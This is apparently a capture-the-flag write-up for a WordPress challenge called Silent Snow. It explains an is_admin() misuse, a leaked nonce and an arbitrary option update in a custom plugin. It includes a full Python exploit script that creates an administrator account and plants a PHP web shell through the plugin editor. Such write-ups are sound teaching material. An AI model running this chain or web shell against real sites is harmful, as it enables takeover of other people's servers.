# htb university 2025 silentsnow

![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Silent Snow</font>

2<sup>nd</sup> December 2025

Prepared By: `dimasmaulana`

Challenge Author(s): `dimasmaulana`

Difficulty: <font color='blue'>very easy</font>

<br><br>

# Synopsis

Silent Snow is a very easy web challenges that enforece user to identify and exploit an Arbitrary Option Update vulnerability in a custom WordPress plugin to escalate privileges, then achieve Remote Code Execution (RCE) to retrieve the flag.

## Description

The Snow-Post Owl Society, is responsible for delivering all important news, including this week's festival updates and RSVP confirmations, precisely at midnight. However, a malicious code of the Tinker's growing influence—has corrupted the automation on the official website. As a result, no one is receiving the crucial midnight delivery, which means the village doesn't have the final instructions for the Festival, including the required attire, times, dates, and locations. This is a direct consequence of the Tinker’s logic of restrictive festive code, ensuring that the joyful details are locked away. Your mission is to hack the official Snow-Post Owl Society website and find a way to bypass the corrupted code to trigger a mass resent of the latest article, ensuring the Festival details reach every resident before the lights dim forever.

## Skills Required

- PHP
- WordPress Structure & Internals
- HTTP Request Manipulation
- Code Analysis

## Skills Learned

- Exploiting `is_admin()` misconfigurations in WordPress.
- Arbitrary Option Update vulnerabilities.
- WordPress Privilege Escalation.
- Achieving RCE via WordPress Plugin Editor.

# Enumeration

## Take a look at the website

Taking a look at the website frontend and source code, we can see that it is a WordPress website with a custom theme and plugin.

![alt text](assets/web_banner.png)
![alt text](assets/article.png)
![alt text](assets/src.png)

## Analyzing the source code

We are provided with the source code of a WordPress instance, including a custom plugin located at `challenge/src/plugins/my-plugin/my-plugin.php`.

Analyzing `my-plugin.php`, we notice a few interesting things:

1.  **Auto-login on Registration**:
    The plugin automatically logs in any user immediately after they register.
    ```php
    function my_auto_login_new_user( $user_id ) {
        // ...
        wp_set_current_user( $user_id, $user->user_login );
        wp_set_auth_cookie( $user_id );
        // ...
    }
    add_action( 'user_register', 'my_auto_login_new_user' );
    ```

2.  **Vulnerable `init` Hook**:
    The plugin registers an `init` function hooked to `wp_loaded`.
    ```php
    public function init() {
        if (isset($_GET['settings'])) {
            $this->admin_page();
            exit;
        }
    }
    add_action("wp_loaded", array($this, "init"), 9999);
    ```
    If the `settings` GET parameter is present, it calls `admin_page()`.

3.  **Vulnerable `admin_page` Method**:
    ```php
    public function admin_page() {
        // Ensure user is admin
        if (!is_admin()) {
            wp_die('Access denied');
        }

        if (isset($_POST['my_plugin_action'])) {
            check_admin_referer("my_plugin_nonce", "my_plugin_nonce");
            
            $mode = sanitize_text_field($_POST['mode']);
            update_option($_POST['my_plugin_action'], $mode);
            echo '<div class="updated"><p>Mode saved.</p></div>';
        }
        // ...
        // Renders form with nonce
        <?php wp_nonce_field('my_plugin_nonce', 'my_plugin_nonce'); ?>
        // ...
    }
    ```

# Solution

## Finding the vulnerability

The vulnerability lies in the `admin_page` method and how `is_admin()` works.

1.  **`is_admin()` Bypass**: The `is_admin()` function in WordPress checks if the requested URL is an administrative page (i.e., part of `/wp-admin/`). It **does not** check if the user is authenticated as an administrator.
    By accessing `/wp-admin/admin-ajax.php?settings=1`, an attacker can satisfy the `is_admin()` check because the request is within the `/wp-admin/` path.

2.  **Nonce Leak**: Since `admin_page` renders the settings form when accessed, and we can access it unauthenticated via the method above, we can extract the valid `my_plugin_nonce` from the response HTML.

3.  **Arbitrary Option Update**: The code uses `update_option($_POST['my_plugin_action'], $mode)`. Since `my_plugin_action` comes directly from POST data and is not validated against a whitelist, we can update **any** WordPress option in the database.

## Exploitation

### Attack Strategy

1.  **Retrieve Nonce**: Send a GET request to `/wp-admin/admin-ajax.php?settings=1` to leak the `my_plugin_nonce`.
2.  **Enable Registration**: Send a POST request to the same endpoint with `my_plugin_action=users_can_register` and `mode=1`. This enables the "Anyone can register" option.
3.  **Escalate Privileges**: Send a POST request with `my_plugin_action=default_role` and `mode=administrator`. This sets the default role for new users to Administrator.
4.  **Register Admin**: Register a new user via `/wp-login.php?action=register`. Due to the changed settings, this user will be an Administrator. The `my_auto_login_new_user` function will automatically log us in.
5.  **RCE**: Use the Administrator access to edit the "Hello Dolly" plugin (or any other plugin) via the Plugin Editor (`/wp-admin/plugin-editor.php`), injecting a PHP web shell.
6.  **Get Flag**: Execute commands to read the flag.

### Exploitation Script

The following Python script implements the attack:

```python
import httpx
import asyncio
import re
import random
import string

URL = "http://localhost:1337"

class API:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url)
        
    async def get_nonce(self):
        # Access admin-ajax.php to bypass is_admin() and get the nonce
        res = await self.c.get("/wp-admin/admin-ajax.php?settings=1")
        return re.search("name=\"my_plugin_nonce\" value=\"(.*?)\"", res.text).group(1)

    async def settings(self, my_plugin_action, mode, nonce):
        # Arbitrary Option Update
        request = await self.c.post("/wp-admin/admin-ajax.php", 
            params={"settings": "1"}, 
            data={"my_plugin_action": my_plugin_action, "my_plugin_nonce": nonce, "mode": mode},
        )
        return request

    async def wp_register(self, username, email):
        # Register user (becomes Admin due to default_role change)
        # Plugin auto-logs us in
        request = await self.c.post("/wp-login.php?action=register", 
            data={"user_login": username, "user_email": email, "wp-submit": "Register"},
        )
        return request
    
    async def edit_hello_dolly_code(self, code):
        # Get nonce for plugin editor
        res = await self.c.get("/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php")
        
        match = re.search(r'name="nonce" value="([^"]+)"', res.text)
        if not match:
             match = re.search(r'value="([^"]+)" name="nonce"', res.text)
        
        nonce = match.group(1)
        
        # Inject code
        res = await self.c.post("/wp-admin/plugin-editor.php", data={
            "_wpnonce": nonce,
            "nonce": nonce,
            "_wp_http_referer": "/wp-admin/plugin-editor.php?file=hello.php&plugin=hello.php",
            "newcontent": code,
            "action": "update",
            "file": "hello.php",
            "plugin": "hello.php",
            "submit": "Update File"
        })
        return res

async def main():
    api = API()
    print("[*] Getting nonce...")
    nonce = await api.get_nonce()
    print(f"[*] Nonce: {nonce}")

    print("[*] Enabling user registration...")
    await api.settings("users_can_register", "1", nonce)
    
    print("[*] Setting default role to administrator...")
    await api.settings("default_role", "administrator", nonce)

    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    email = f"{username}@example.com"
    print(f"[*] Registering admin user: {username}")
    await api.wp_register(username, email)
    
    payload = """<?php
/**
 * Plugin Name: Hello Dolly
 */
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
"""
    print("[*] Injecting webshell into Hello Dolly...")
    await api.edit_hello_dolly_code(payload)
    
    print("[*] Executing command...")
    res = await api.c.get("/wp-content/plugins/hello.php", params={"cmd": "cat /flag.txt"})
    print(f"[*] Flag: {res.text.strip()}")

if __name__ == "__main__":
    asyncio.run(main())
```

### Getting the flag

1.  Run the exploit script against the target instance.
2.  The script will register an admin user, inject a shell, and retrieve the flag.